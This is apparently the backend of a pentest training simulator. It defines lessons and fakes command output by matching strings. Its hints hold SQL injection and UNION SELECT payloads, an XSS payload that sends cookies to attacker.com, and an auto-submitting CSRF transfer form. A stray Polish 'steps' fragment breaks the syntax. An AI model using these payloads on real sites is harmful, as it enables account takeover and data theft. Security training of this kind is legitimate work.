const sqlite3 = require("sqlite3").verbose();
const path = require("path");

const dbPath = path.join(__dirname, "..", "database.db");
const db = new sqlite3.Database(dbPath);

const phases = [
  {
    id: "reconnaissance",
    title: "Phase 1: Reconnaissance",
    description:
      "Gather information about the application without active attacks",
    steps: [
      {
        id: "initial-visit",
        title: "Visit and analyze the page",
        description: "Open the application and see what you can discover",
        task: "Click the button below to open the test application",
        action: "visit",
        hints: [
          "Pay attention to the login form",
          "Check what fields are available",
          "See if there are any errors in the console",
        ],
      },
      {
        id: "check-source",
        title: "Check the source code",
        description:
          "Many applications expose sensitive information in HTML code",
        task: "Find hidden comments or scripts in the code",
        action: "view-source",
        hints: [
          "Look for HTML comments <!-- -->",
          "Check if there are hidden inputs (type='hidden')",
          "See what scripts are loaded",
        ],
      },
      {
        id: "check-robots",
        title: "Check robots.txt and sitemap.xml",
        description: "These files often reveal hidden paths",
        task: "Check if robots.txt and sitemap.xml files exist",
        action: "check-files",
        hints: [
          "Use curl or browser",
          "Check: /robots.txt",
          "Check: /sitemap.xml",
        ],
      },
      {
        id: "technology-detection",
        title: "Detect used technologies",
        description: "Technology stack identification is key",
        task: "Detect what technologies the application uses",
        action: "detect-tech",
        hints: [
          "Check HTTP headers (curl -I)",
          "See HTML source",
          "Use tools like Wappalyzer",
        ],
      },
    ],
  },
  {
    id: "scanning",
    title: "Phase 2: Scanning",
    description: "Actively scan and test for vulnerabilities",
    steps: [
      {
        id: "test-login",
        title: "Test the login form",
        description: "Check how the application reacts to different data",
        task: "Try different combinations in the login form",
        action: "test-login",
        hints: [
          "Try empty fields",
          "Try very long strings",
          "See what error messages appear",
          "Does the application reveal if username exists?",
        ],
      },
      {
        id: "test-sql-injection",
        title: "Test SQL Injection",
        description: "Check if the form is vulnerable to SQL Injection",
        task: "Inject SQL payload into the form",
        action: "test-sqli",
        hints: [
          "Try: ' OR '1'='1",
          "Try: admin'--",
          "See if you get a SQL error",
        ],
      },
      {
        id: "test-xss",
        title: "Test XSS (Cross-Site Scripting)",
        description: "Check if you can inject JavaScript",
        task: "Inject XSS payload",
        action: "test-xss",
        hints: [
          "Try: <script>alert('XSS')</script>",
          "Try in different fields",
          "Check if the script executes",
        ],
      },
      {
        id: "test-csrf",
        title: "Check CSRF protection",
        description: "Does the application use CSRF tokens?",
        task: "Find forms and check if they have CSRF tokens",
        action: "test-csrf",
        hints: [
          "See the form's HTML",
          "Look for hidden input with token",
          "Check if each request has a unique token",
        ],
      },
      {
        id: "test-authorization",
        title: "Test authorization and access control",
        description: "Can you access resources without permissions?",
        task: "Try to access /admin without logging in",
        action: "test-authz",
        hints: [
          "Try: curl /admin",
          "Try: curl /api/users",
          "See if you need authorization",
        ],
      },
    ],
  },
  {
    id: "exploitation",
    title: "Phase 3: Exploitation",
    description: "Exploit the found vulnerabilities",
    steps: [
      {
        id: "exploit-sqli",
        title: "Exploit SQL Injection",
        description: "Log in as admin without password",
        task: "Inject SQL payload to bypass login",
        action: "exploit-sqli",
        hints: [
          "Use: admin' OR '1'='1'--",
          "Try to log in as admin",
          "Check if you're logged in",
        ],
      },
      {
        id: "extract-data",
        title: "Extract data from database",
        description: "Use UNION SELECT for data extraction",
        task: "Get the list of users from the database",
        action: "extract-data",
        hints: [
          "Use UNION SELECT",
          "First determine the number of columns",
          "Get username and password",
          "Example: ' UNION SELECT null,username,password FROM users--",
        ],
      },
      {
        id: "exploit-xss",
        title: "Exploit XSS to steal cookies",
        description: "Create a payload that will steal cookies",
        task: "Inject a script that will send cookies to your server",
        action: "exploit-xss",
        hints: [
          "Use: <script>document.location='http://attacker.com?c='+document.cookie</script>",
          "Place it in a comment or profile",
          "Wait for admin to see it",
        ],
      },
      {
        id: "exploit-csrf",
        title: "Create CSRF attack",
        description: "Prepare a malicious page for CSRF attack",
        task: "Create HTML with a form that auto-submits",
        action: "exploit-csrf",
        hints: [
          "Copy the transfer form structure",
          "Set action to application URL",
          "Add JavaScript for auto-submit",
          "Example: document.forms[0].submit()",
        ],
      },
    ],
  },
  {
    id: "reporting",
    title: "Phase 4: Reporting",
    description: "Document your findings",
    steps: [
      {
        id: "document-findings",
        title: "Document findings",
        description: "Describe each found vulnerability",
        task: "Create a report of all vulnerabilities",
        action: "document",
        hints: [
          "For each vulnerability describe: Title, Description, Reproduction steps",
          "Add screenshots or logs",
          "Assess the security impact",
        ],
      },
      {
        id: "rate-severity",
        title: "Rate vulnerability severity",
        description: "Use CVSS or your own scale",
        task: "Rate each vulnerability (Critical, High, Medium, Low)",
        action: "rate-severity",
        hints: [
          "SQL Injection with data access = Critical",
          "XSS = High/Medium depending on context",
          "CSRF on critical action = High",
          "Information disclosure = Low/Medium",
        ],
      },
      {
        id: "recommendations",
        title: "Propose recommendations",
        description: "How to fix the found problems?",
        task: "Add recommendations for each vulnerability",
        action: "recommend",
        hints: [
          "SQL Injection: Prepared Statements, ORM",
          "XSS: Content-Security-Policy, encoding",
          "CSRF: CSRF tokens, SameSite cookies",
          "Broken Access: proper authorization checks",
        ],
      },
    ],
  },
];
steps: [
  { id: "document-findings", title: "Udokumentuj znaleziska" },
  { id: "rate-severity", title: "Oceń severity podatności" },
  { id: "recommendations", title: "Zaproponuj rekomendacje" },
];

const executeCommand = (command, currentPhase, currentStep) => {
  const output = [];
  let stepCompleted = false;
  let vulnerabilityFound = null;
  let discoveredInfo = {};

  const currentStepData = phases[currentPhase]?.steps[currentStep];

  if (!currentStepData) {
    return {
      success: false,
      error: "Invalid phase or step",
      output: [{ type: "error", text: "Błąd: nieprawidłowa faza lub krok" }],
    };
  }

  if (command.includes("curl") && command.includes("robots.txt")) {
    output.push({
      type: "success",
      text: `User-agent: *
Disallow: /admin
Disallow: /api/v1
Disallow: /backup
Disallow: /.git`,
    });

    discoveredInfo.endpoints = ["/admin", "/api/v1", "/backup", "/.git"];

    if (currentStepData.id === "check-robots") {
      stepCompleted = true;
    }
  } else if (command.includes("curl") && command.includes("-I")) {
    output.push({
      type: "success",
      text: `HTTP/1.1 200 OK
Server: nginx/1.18.0
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Set-Cookie: session=eyJhbGc...`,
    });

    discoveredInfo.technologies = ["Express.js", "nginx"];
    discoveredInfo.headers = ["X-Powered-By: Express"];

    if (currentStepData.id === "technology-detection") {
      stepCompleted = true;
    }
  } else if (command.includes("admin' OR '1'='1'--")) {
    output.push({ type: "success", text: "Payload wykonany pomyślnie!" });
    output.push({ type: "success", text: "Logged in successfully!" });
    output.push({ type: "success", text: "Welcome, admin!" });
    output.push({
      type: "info",
      text: "Session: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    });

    if (currentStepData.id === "exploit-sqli") {
      stepCompleted = true;
    }
  } else if (command.includes("' OR '1'='1")) {
    output.push({
      type: "error",
      text: "SQL Error: You have an error in your SQL syntax near ''1'='1'' at line 1",
    });
    output.push({
      type: "success",
      text: "Znaleziono podatność: SQL Injection!",
    });

    vulnerabilityFound = {
      type: "SQL Injection",
      severity: "Critical",
      location: "Login form",
    };

    if (currentStepData.id === "test-sql-injection") {
      stepCompleted = true;
    }
  } else if ((command.includes("<script>") || command.includes("alert")) && 
             currentStepData.id !== "exploit-csrf") {
    // XSS check - but skip if we're in CSRF step
    output.push({
      type: "success",
      text: "Alert executed! Found vulnerability: XSS!",
    });

    vulnerabilityFound = {
      type: "Cross-Site Scripting (XSS)",
      severity: "High",
      location: "Search field",
    };

    if (currentStepData.id === "test-xss") {
      stepCompleted = true;
    }
    
    // Check for cookie stealing payload
    if (currentStepData.id === "exploit-xss" && 
        (command.includes("document.cookie") || command.includes("document.location"))) {
      output.push({
        type: "success",
        text: "Cookie stealing payload detected! Admin cookies would be sent to attacker server.",
      });
      output.push({
        type: "info",
        text: "Captured cookies: session=eyJhbGc...; admin_token=abc123...",
      });
      stepCompleted = true;
    }
  } else if ((command.includes("<form") || command.includes("form")) && 
             (command.includes("submit") || command.includes("action")) &&
             currentStepData.id === "exploit-csrf") {
    // CSRF check - only for exploit-csrf step
    output.push({
      type: "success",
      text: "CSRF payload created successfully!",
    });
    output.push({
      type: "code",
      text: `<html>
<body>
<form action="https://vulnerable-bank.local/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>`,
    });
    output.push({
      type: "info",
      text: "This page will auto-submit when admin visits it!",
    });

    vulnerabilityFound = {
      type: "Cross-Site Request Forgery (CSRF)",
      severity: "High",
      location: "Transfer form",
    };

    if (currentStepData.id === "exploit-csrf") {
      stepCompleted = true;
    }
  } else if (command.includes("UNION SELECT")) {
    output.push({
      type: "success",
      text: `Users found:
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
|  2 | user1    | e10adc3949ba59abbe56e057f20f883e |
|  3 | user2    | 25d55ad283aa400af464c76d713c07ad |
+----+----------+----------------------------------+`,
    });

    if (currentStepData.id === "extract-data") {
      stepCompleted = true;
    }
  } else {
    output.push({
      type: "info",
      text: `Command not recognized: ${command}`,
    });
    output.push({
      type: "info",
      text: "Try: curl, nmap, sqlmap, or use the action buttons",
    });
  }

  return {
    success: true,
    output,
    stepCompleted,
    vulnerabilityFound,
    discoveredInfo,
  };
};

exports.executeCommand = (req, res) => {
  try {
    const { command, currentPhase, currentStep, sessionId } = req.body;

    if (!command || currentPhase === undefined || currentStep === undefined) {
      return res.status(400).json({
        success: false,
        error: "Missing required fields: command, currentPhase, currentStep",
      });
    }

    const result = executeCommand(command, currentPhase, currentStep);

    if (result.stepCompleted && sessionId) {
      const newPhase =
        currentStep >= phases[currentPhase].steps.length - 1
          ? currentPhase + 1
          : currentPhase;
      const newStep =
        currentStep >= phases[currentPhase].steps.length - 1
          ? 0
          : currentStep + 1;

      db.run(
        `INSERT OR REPLACE INTO pentest_progress (session_id, current_phase, current_step, updated_at)
         VALUES (?, ?, ?, datetime('now'))`,
        [sessionId, newPhase, newStep],
        (err) => {
          if (err) console.error("Error saving progress:", err);
        }
      );

      if (result.vulnerabilityFound) {
        db.run(
          `INSERT INTO pentest_vulnerabilities (session_id, type, severity, location, found_at)
           VALUES (?, ?, ?, ?, datetime('now'))`,
          [
            sessionId,
            result.vulnerabilityFound.type,
            result.vulnerabilityFound.severity,
            result.vulnerabilityFound.location,
          ],
          (err) => {
            if (err) console.error("Error saving vulnerability:", err);
          }
        );
      }

      if (result.discoveredInfo) {
        const info = JSON.stringify(result.discoveredInfo);
        db.run(
          `INSERT INTO pentest_discoveries (session_id, discovered_data, discovered_at)
           VALUES (?, ?, datetime('now'))`,
          [sessionId, info],
          (err) => {
            if (err) console.error("Error saving discovery:", err);
          }
        );
      }
    }

    res.json(result);
  } catch (error) {
    console.error("Error in executeCommand:", error);
    res.status(500).json({
      success: false,
      error: "Internal server error",
    });
  }
};

exports.getProgress = (req, res) => {
  try {
    const { sessionId } = req.query;

    if (!sessionId) {
      return res.status(400).json({
        success: false,
        error: "Missing sessionId",
      });
    }

    db.get(
      `SELECT current_phase, current_step, updated_at 
       FROM pentest_progress 
       WHERE session_id = ?`,
      [sessionId],
      (err, progress) => {
        if (err) {
          return res.status(500).json({
            success: false,
            error: "Database error",
          });
        }

        db.all(
          `SELECT type, severity, location, found_at 
           FROM pentest_vulnerabilities 
           WHERE session_id = ?
           ORDER BY found_at DESC`,
          [sessionId],
          (err, vulnerabilities) => {
            if (err) {
              return res.status(500).json({
                success: false,
                error: "Database error",
              });
            }

            db.all(
              `SELECT discovered_data, discovered_at 
               FROM pentest_discoveries 
               WHERE session_id = ?
               ORDER BY discovered_at DESC`,
              [sessionId],
              (err, discoveries) => {
                if (err) {
                  return res.status(500).json({
                    success: false,
                    error: "Database error",
                  });
                }

                const aggregatedDiscoveries = {
                  technologies: [],
                  endpoints: [],
                  headers: [],
                };

                discoveries.forEach((d) => {
                  try {
                    const data = JSON.parse(d.discovered_data);
                    if (data.technologies) {
                      aggregatedDiscoveries.technologies = [
                        ...new Set([
                          ...aggregatedDiscoveries.technologies,
                          ...data.technologies,
                        ]),
                      ];
                    }
                    if (data.endpoints) {
                      aggregatedDiscoveries.endpoints = [
                        ...new Set([
                          ...aggregatedDiscoveries.endpoints,
                          ...data.endpoints,
                        ]),
                      ];
                    }
                    if (data.headers) {
                      aggregatedDiscoveries.headers = [
                        ...new Set([
                          ...aggregatedDiscoveries.headers,
                          ...data.headers,
                        ]),
                      ];
                    }
                  } catch (e) {
                    console.error("Error parsing discovery data:", e);
                  }
                });

                res.json({
                  success: true,
                  progress: progress || { current_phase: 0, current_step: 0 },
                  vulnerabilities: vulnerabilities || [],
                  discoveries: aggregatedDiscoveries,
                });
              }
            );
          }
        );
      }
    );
  } catch (error) {
    console.error("Error in getProgress:", error);
    res.status(500).json({
      success: false,
      error: "Internal server error",
    });
  }
};

exports.resetProgress = (req, res) => {
  try {
    const { sessionId } = req.body;

    if (!sessionId) {
      return res.status(400).json({
        success: false,
        error: "Missing sessionId",
      });
    }

    db.serialize(() => {
      db.run(`DELETE FROM pentest_progress WHERE session_id = ?`, [sessionId]);
      db.run(`DELETE FROM pentest_vulnerabilities WHERE session_id = ?`, [
        sessionId,
      ]);
      db.run(
        `DELETE FROM pentest_discoveries WHERE session_id = ?`,
        [sessionId],
        (err) => {
          if (err) {
            return res.status(500).json({
              success: false,
              error: "Database error",
            });
          }

          res.json({
            success: true,
            message: "Progress reset successfully",
          });
        }
      );
    });
  } catch (error) {
    console.error("Error in resetProgress:", error);
    res.status(500).json({
      success: false,
      error: "Internal server error",
    });
  }
};

exports.getPhases = (req, res) => {
  try {
    res.json({
      success: true,
      phases,
    });
  } catch (error) {
    console.error("Error in getPhases:", error);
    res.status(500).json({
      success: false,
      error: "Internal server error",
    });
  }
};
